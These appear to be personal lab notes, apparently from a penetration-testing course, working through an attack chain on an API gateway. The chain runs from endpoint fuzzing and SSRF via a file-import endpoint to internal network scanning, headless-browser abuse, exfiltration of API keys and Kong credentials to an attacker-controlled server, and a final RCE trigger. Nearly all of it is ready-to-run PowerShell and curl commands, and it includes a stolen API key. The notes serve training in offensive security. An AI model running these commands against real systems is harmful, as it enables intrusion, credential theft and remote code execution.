directory scan:
```powershell
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://apigateway:8000/FUZZ -t 200 -o endpoints.json
```
We could convert the json into a hashmap and work with the object:
```powershell
$hashtable = gc -raw ./endpoints.json | ConvertFrom-Json -AsHashtable 
$hashtable.results
```
but here is a more effective one liner:
```powershell
gc -raw ./endpoints.json | ConvertFrom-Json -AsHashtable | % -process { $_.results.GetEnumerator()} | % -process {Add-Content -Path parsed-urls.txt -Value $_.url}
```
Stripped Files
```powershell
foreach ($i in gc ./parsed-urls.txt) {Add-Content -Path endpoints-stripped.txt -value $i.split('/')[3]}
```
Http verb tampering
```powershell
Invoke-RouteBuster -ActionList ./actions-only-valid.txt -Wordlist ./wordlist-only-valid.txt -Target http://apigateway:8000 -Methods get,post
```

ssrf poc:
In particular this is a good example of how to send a json payload
```powershell
iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://192.168.119.144/"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
```
```bash
curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.118.3/ssrftest"}' http://apigateway:8000/files/import
```

One interesting observeration is that python3 webserver provides less information than apache. To be specific when reading the apache servers logs we are able to see the user agent of the file import microservice: axios/0.21.1
```bash
sudo systemctl start apache2
sudo systemctl status apache
sudo tail /var/log/apache2/access.log -f
```

One thing also worth mentioning is that 'Access-Control-Allow-Credentials' is set on file/import and almost every other endpoing we bruteforced 
```bash
sudo tail /var/log/apache2/access.log -f
```

We can scan a list of gateways with:
```powershell
Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -NetworkAddress '172.16.16.0/22' -Ports 8000 -Gateway
```
We can detect all of the live hosts and scan ports within the '172.16.16.0/28' range (/28 gives us the first 15 ip addresses, /29 gives the first 6)
```powershell
Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -NetworkAddress '172.16.16.0/28' -Hosts -Open
```
```powershell
Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -NetworkAddress '172.16.16.0/29' -Ports 8000 -Hosts -Open
```


headless chrome test powershell:
```powershell
iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://172.16.16.2:9000/api/render?url=http://192.168.119.163/test.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
```
Exfiltration via Javascript. Note that the internal Javascript reaches out to 172.16.16.4:8001 so at this point there are two ssrf targets.
- 172.16.16.2:9000
- 172.16.16.4:8001
```powershell
iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://172.16.16.2:9000/api/render?url=http://192.168.119.163/exfiltration.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
```
Exfiltrate api key
```powershell
iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://172.16.16.2:9000/api/render?url=http://192.168.119.163/api-key-extraction.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
```
Authenticated request to /render service
```powershell
iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
```

Without calling the File Import service, recreate the attack to steal credentials from Kong by calling the Render service directly with the API key.
```powershell
iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163/api-key-extraction.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
```
Adjust your HTML payload so the credentials are included in the PDF the service returns:
This version is as a pdf
```powershell
iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://172.16.16.4:8001/key-auths"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck -Outfile apicredentials.pdf
```
This version is as html, learned about the output parameter from: https://github.com/alvarcarto/url-to-pdf-api
```powershell
iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://172.16.16.4:8001/key-auths"; "output"="html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
```

Using flask as a callbackserver to server the javascript payloads and process their outputs.
```powershell
iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163:1080/exfiltration_extramile_chunked.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
```
```powershell
iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163:1080/api-key-extraction-callback-server.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
```

rce:
```powershell
iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://172.16.16.2:9000/api/render?url=http://192.168.119.163/rce.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
```
```powershell
iwr -Uri 'http://apigateway:8000/donkey' -SkipHttpErrorCheck
```